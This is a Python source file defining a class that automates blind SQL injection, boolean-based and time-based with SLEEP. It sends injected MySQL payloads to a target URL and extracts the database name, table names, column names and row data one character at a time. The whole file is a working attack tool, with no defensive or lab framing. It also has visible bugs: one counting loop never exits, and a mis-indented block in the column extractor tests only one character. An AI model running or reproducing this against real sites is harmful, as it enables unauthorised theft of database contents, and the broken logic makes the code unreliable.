import sys
import threading
import time
import itertools
import requests


class DatabaseLengthChecker:
    def __init__(self, url, pre_payload):
        self.url = url
        self.pre_payload = pre_payload
        self.stop_spinner = False  # Flag to stop the spinner thread
        self.length_database_name = 0
        self.number_of_table = 0
        self.table_names = []
        self.method = ""

    def get_database_length(self):
        length = 1
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        while True:
            if self.method == 'boolean':
                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT LENGTH(DATABASE()))>{length},1,2)-- -"

                try:
                    response = requests.get(payload)

                    if response.text == '1':
                        length += 1
                    else:
                        break
                except Exception as e:
                    print(f"Error while testing: {e}")
                    self.stop_spinner = True  # Signal to stop the spinner
                    spinner_thread.join(timeout=0.1)
                    return None
            else:
                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT LENGTH(DATABASE()))>{length},sleep(10),2)-- -"

                try:
                    start_time = time.time()
                    response = requests.get(payload)
                    elapsed_time = time.time() - start_time

                    if elapsed_time > 10:
                        length += 1
                    else:
                        break
                except Exception as e:
                    print(f"Error while testing: {e}")
                    self.stop_spinner = True  # Signal to stop the spinner
                    spinner_thread.join(timeout=0.1)
                    return None

        self.stop_spinner = True  # Signal to stop the spinner
        spinner_thread.join()  # Ensure the spinner thread terminates

        print('\rDone!              ')
        self.length_database_name = length
        return length

    def get_extract_database_name(self):
        database_name = ""
        spinner_running = True
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()
        for position in range(1, self.length_database_name + 1):
            for char in range(32, 127):
                char_to_test = chr(char)
                if self.method == 'boolean':
                    payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT SUBSTRING(DATABASE(), {position}, 1))='{char_to_test}',1,2)-- -"
                    try:
                        response = requests.get(payload)
                        if response.text == '1':
                            database_name += char_to_test
                            print(f"\rCurrent database name: {database_name}", end='', flush=True)
                            break
                    except Exception as e:
                        print(f"\nError while testing: {e}")
                        self.stop_spinner = True  # Signal to stop the spinner
                        spinner_thread.join(timeout=0.1)
                        return None
                else:
                    payload = f"{self.url}{self.pre_payload} and IF((SELECT SUBSTRING(DATABASE(), {position}, 1))='{char_to_test}',sleep(10),2)-- -"
                    try:
                        start_time = time.time()
                        response = requests.get(payload)
                        elapsed_time = time.time() - start_time
                        if elapsed_time>10:
                            database_name += char_to_test
                            print(f"\rCurrent database name: {database_name}", end='', flush=True)
                            break
                    except Exception as e:
                        print(f"\nError while testing: {e}")
                        self.stop_spinner = True  # Signal to stop the spinner
                        spinner_thread.join(timeout=0.1)
                        return None

        self.stop_spinner = True  # Signal to stop the spinner
        spinner_thread.join(timeout=0.1)
        return database_name

    def get_number_of_tables(self):

        number_of_tables = 0
        spinner_running = True
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        while True:
            # Construct the SQL Injection payload to count the tables
            if self.method == 'boolean':
                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>{number_of_tables},1,2)-- -"
            else:
                payload = f"{self.url}{self.pre_payload} and IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>{number_of_tables},sleep(10),2)-- -"

            try:
                if self.method == 'boolean':
                    response = requests.get(payload)
                    if response.text == '1':
                        number_of_tables += 1

                else:
                    start_time = time.time()
                    response = requests.get(payload)
                    elapsed_time = time.time() - start_time
                    if elapsed_time > 10:
                        number_of_tables += 1



            except Exception as e:
                print(f"\nError while testing: {e}")
                self.stop_spinner = True  # Signal to stop the spinner
                spinner_thread.join(timeout=0.1)
                return None

        self.stop_spinner = True  # Signal to stop the spinner
        spinner_thread.join(timeout=0.1)

        print('\rDone!              ')
        self.number_of_table = number_of_tables
        return number_of_tables

    def extract_table_names(self):
        table_names = []
        self.stop_spinner = False
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        try:
            # Loop through each table index
            for table_index in range(self.number_of_table):
                table_name = ""
                position = 1

                while True:
                    character_found = False  # Flag to check if a character is found

                    # Iterate over all printable ASCII characters
                    for char in range(32, 127):
                        char_to_test = chr(char)
                        payload = ""
                        if self.method == 'boolean':
                            payload = (
                                f"{self.url}{self.pre_payload} and 1=IF("
                                f"(SELECT SUBSTRING(TABLE_NAME, {position}, 1) FROM INFORMATION_SCHEMA.TABLES "
                                f"WHERE TABLE_SCHEMA=DATABASE() LIMIT {table_index},1)='{char_to_test}',1,2)-- -"
                            )
                        else:
                            payload = (f"{self.url}{self.pre_payload} and IF("
                                       f"(SELECT SUBSTRING(TABLE_NAME, {position}, 1) FROM INFORMATION_SCHEMA.TABLES "
                                       f"WHERE TABLE_SCHEMA=DATABASE() LIMIT {table_index},1)='{char_to_test}',sleep(10),2)-- -")

                        try:
                            if self.method == 'boolean':
                                response = requests.get(payload)
                                if response.text == '1':

                                    if char_to_test == ' ':
                                        break
                                    table_name += char_to_test
                                    print(f"\rExtracting table names: {table_name}", end='', flush=True)
                                    position += 1
                                    character_found = True
                                    break
                            else:
                                start_time = time.time()
                                response = requests.get(payload)
                                elapsed_time = time.time() - start_time
                                if elapsed_time > 10:

                                    if char_to_test == ' ':
                                        break
                                    table_name += char_to_test
                                    print(f"\rExtracting table names: {table_name}", end='', flush=True)
                                    position += 1
                                    character_found = True
                                    break

                        except Exception as e:
                            print(f"\nError while testing: {e}")
                            self.stop_spinner = True
                            spinner_thread.join(timeout=0.1)
                            return None

                    if not character_found:  # If no character was found, the table name is complete
                        break

                if table_name.strip():  # Add the complete table name to the list if it's not empty
                    table_names.append(table_name.strip())

        finally:
            self.stop_spinner = True
            spinner_thread.join(timeout=0.1)
            print('\nDone! Retrieved table names.')

        self.table_names = table_names
        return table_names

    def extract_fields_for_table(self, table_name):
        fields = []  # List to store fields for the specified table
        self.stop_spinner = False
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        try:
            column_index = 0

            while True:
                field_name = ""
                position = 1

                while True:
                    character_found_in_field = False

                    for char in range(32, 127):  # ASCII printable characters range
                        char_to_test = chr(char)
                        payload = ""
                    if self.method == 'boolean':
                        payload = (
                            f"{self.url}{self.pre_payload} and 1=IF("
                            f"(SELECT SUBSTRING(COLUMN_NAME, {position}, 1) FROM INFORMATION_SCHEMA.COLUMNS "
                            f"WHERE TABLE_NAME='{table_name}' LIMIT {column_index},1)='{char_to_test}',1,2)-- -"
                        )
                    else:
                        payload = (
                            f"{self.url}{self.pre_payload} and IF("
                            f"(SELECT SUBSTRING(COLUMN_NAME, {position}, 1) FROM INFORMATION_SCHEMA.COLUMNS "
                            f"WHERE TABLE_NAME='{table_name}' LIMIT {column_index},1)='{char_to_test}',sleep(10),2)-- -"
                        )
                    if self.method == 'boolean':
                        try:
                            response = requests.get(payload)
                            if response.text == '1':
                                if char_to_test == ' ':
                                    break  # Stop if a space is encountered
                                field_name += char_to_test
                                print(f"\rExtracting fields for {table_name}: {field_name}", end='', flush=True)
                                position += 1
                                character_found_in_field = True
                                break
                        except Exception as e:
                            print(f"\nError while testing: {e}")
                            self.stop_spinner = True
                            spinner_thread.join(timeout=0.1)
                            return None
                    else:
                        try:
                            start_time = time.time()
                            response = requests.get(payload)
                            elapsed_time = time.time() - start_time
                            if elapsed_time > 10:
                                if char_to_test == ' ':
                                    break  # Stop if a space is encountered
                                field_name += char_to_test
                                print(f"\rExtracting fields for {table_name}: {field_name}", end='', flush=True)
                                position += 1
                                character_found_in_field = True
                                break
                        except Exception as e:
                            print(f"\nError while testing: {e}")
                            self.stop_spinner = True
                            spinner_thread.join(timeout=0.1)
                            return None

                    if not character_found_in_field:
                        break  # Exit loop if no more characters are found

                if field_name.strip():  # Add the field name if it's not empty
                    fields.append(field_name.strip())
                    print()  # Print a newline to separate field names
                    column_index += 1
                else:
                    break  # Exit loop if no field name is found

        finally:
            self.stop_spinner = True
            spinner_thread.join(timeout=0.1)
            print('\nDone! Retrieved fields for the table.')

        return fields

    def extract_data(self, table_name, field_name):
        data = []  # List to store data from the specified field
        self.stop_spinner = False
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        try:
            row_index = 0

            while True:
                row_data = ""
                position = 1

                while True:
                    character_found_in_row = False

                    for char in range(32, 127):  # ASCII printable characters range
                        char_to_test = chr(char)
                        # Construct the SQL Injection payload
                        payload = ''
                        if self.method == 'boolean':
                            payload = (
                                f"{self.url}{self.pre_payload} and 1=IF("
                                f"(SELECT SUBSTRING({field_name}, {position}, 1) FROM {table_name} "
                                f"LIMIT {row_index},1)='{char_to_test}',1,2)-- -"
                            )

                            try:
                                response = requests.get(payload)
                                if response.text == '1':  # Adjust this check as needed
                                    if char_to_test == ' ':
                                        break
                                    row_data += char_to_test
                                    print(f"\rExtracting data from {field_name}: {row_data}", end='', flush=True)
                                    position += 1
                                    character_found_in_row = True
                                    break
                            except Exception as e:
                                print(f"\nError while testing: {e}")
                                self.stop_spinner = True
                                spinner_thread.join(timeout=0.1)
                                return None
                        else:
                            payload = (
                                f"{self.url}{self.pre_payload} and IF("
                                f"(SELECT SUBSTRING({field_name}, {position}, 1) FROM {table_name} "
                                f"LIMIT {row_index},1)='{char_to_test}',sleep(10),2)-- -"
                            )
                            try:
                                start_time = time.time()

                                response = requests.get(payload)
                                elapsed_time = time.time() - start_time

                                if elapsed_time > 10:  # Adjust this check as needed
                                    if char_to_test == ' ':
                                        break
                                    row_data += char_to_test
                                    sys.stdout.write(f"\rExtracting data from {field_name}: {row_data}")
                                    sys.stdout.flush()
                                    print(f"\rExtracting data from {field_name}: {char_to_test}")
                                    print(row_data)

                                    print(f"\rExtracting data from {field_name}: {row_data}", end='', flush=True)
                                    position += 1
                                    character_found_in_row = True
                                    break
                            except Exception as e:
                                print(f"\nError while testing: {e}")
                                self.stop_spinner = True
                                spinner_thread.join(timeout=0.1)
                                return None

                    if not character_found_in_row:
                        # If no more characters are found, the row data is complete
                        break

                if row_data.strip():  # Add the row data if it's not empty
                    data.append(row_data.strip())
                    print()  # Print a newline to separate data entries
                    row_index += 1
                else:
                    # If no row data was found, stop searching for more rows
                    break

        finally:
            self.stop_spinner = True
            spinner_thread.join(timeout=0.1)
            print('\nDone! Retrieved data from the table.')

        return data

    def get_method(self):
        return self.method

    def spinner(self):
        """Show a simple spinner."""
        for spin in itertools.cycle('/-\\|'):
            if self.stop_spinner:  # Check if the spinner should stop
                break
            print(f'\r{spin}', end='', flush=True)
            time.sleep(0.2)
